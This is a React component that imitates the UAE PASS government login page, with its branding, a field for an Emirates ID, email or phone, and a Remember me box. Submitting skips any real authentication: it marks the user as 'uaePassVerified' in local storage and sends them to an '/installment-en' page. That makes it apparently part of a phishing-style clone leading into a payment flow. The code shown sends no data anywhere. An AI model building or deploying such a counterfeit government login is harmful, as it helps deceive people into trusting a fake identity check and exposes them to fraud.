import React, { useState } from "react";
import { useLocation } from "wouter";

export default function UaePassLogin() {
  const [, setLocation] = useLocation();
  const [rememberMe, setRememberMe] = useState(false);
  const [inputValue, setInputValue] = useState("");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    localStorage.setItem("uaePassVerified", "true");
    setLocation("/installment-en");
  };

  return (
    <div style={{ minHeight: "100vh", backgroundColor: "#ffffff", display: "flex", flexDirection: "column" }}>
      {/* Green Top Bar */}
      <div style={{ height: "12px", backgroundColor: "#00a86b", width: "100%" }}></div>

      {/* Main Content */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center", padding: "60px 20px", backgroundColor: "#ffffff" }}>
        <div style={{ maxWidth: "500px", width: "100%" }}>
          {/* Fingerprint Icon - Using actual image */}
          <div style={{ textAlign: "center", marginBottom: "50px" }}>
            <img 
              src="/manus-storage/fingerprint-icon_348b4104.png" 
              alt="Fingerprint" 
              style={{ 
                width: "100px", 
                height: "100px", 
                animation: "spin 2s linear infinite"
              }}
            />
            <style>{`
              @keyframes spin {
                from { transform: rotate(0deg); }
                to { transform: rotate(360deg); }
              }
            `}</style>
          </div>

          {/* Title */}
          <h1 style={{ textAlign: "center", fontSize: "28px", fontWeight: "500", color: "#4a5568", marginBottom: "40px", margin: "0 0 40px 0", letterSpacing: "0.5px" }}>
            Login to UAE PASS
          </h1>

          {/* Form */}
          <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
            {/* Input Field */}
            <input
              type="text"
              placeholder="Emirates ID, email, or phone eg. 971500000000"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              style={{
                width: "100%",
                padding: "16px 18px",
                border: "2px solid #d0d0d0",
                borderRadius: "12px",
                fontSize: "15px",
                boxSizing: "border-box",
                fontFamily: "Arial, sans-serif",
                color: "#666666",
                backgroundColor: "#ffffff",
                transition: "border-color 0.3s",
              }}
              onFocus={(e) => {
                e.target.style.borderColor = "#00a86b";
              }}
              onBlur={(e) => {
                e.target.style.borderColor = "#d0d0d0";
              }}
            />

            {/* Remember Me Checkbox */}
            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
              <input
                type="checkbox"
                id="rememberMe"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                style={{
                  width: "20px",
                  height: "20px",
                  cursor: "pointer",
                  accentColor: "#0052cc",
                }}
              />
              <label htmlFor="rememberMe" style={{ fontSize: "15px", color: "#333333", cursor: "pointer", fontWeight: "500" }}>
                Remember me
              </label>
            </div>

            {/* Login Button */}
            <button
              type="submit"
              style={{
                width: "100%",
                padding: "16px",
                backgroundColor: "#5b6b8f",
                color: "#ffffff",
                border: "none",
                borderRadius: "12px",
                fontSize: "16px",
                fontWeight: "600",
                cursor: "pointer",
                marginTop: "10px",
                transition: "background-color 0.3s",
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.backgroundColor = "#4a5a7f";
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.backgroundColor = "#5b6b8f";
              }}
            >
              Login
            </button>
          </form>

          {/* Links */}
          <div style={{ textAlign: "center", marginTop: "30px", fontSize: "14px" }}>
            <span style={{ color: "#666666" }}>Don't have UAEPASS account? </span>
            <a href="#" style={{ color: "#00a86b", textDecoration: "none", fontWeight: "600", cursor: "pointer" }}>
              Create new account
            </a>
          </div>

          <div style={{ textAlign: "center", marginTop: "15px" }}>
            <a href="#" style={{ color: "#00a86b", textDecoration: "none", fontWeight: "600", fontSize: "14px", cursor: "pointer" }}>
              Recover your account
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
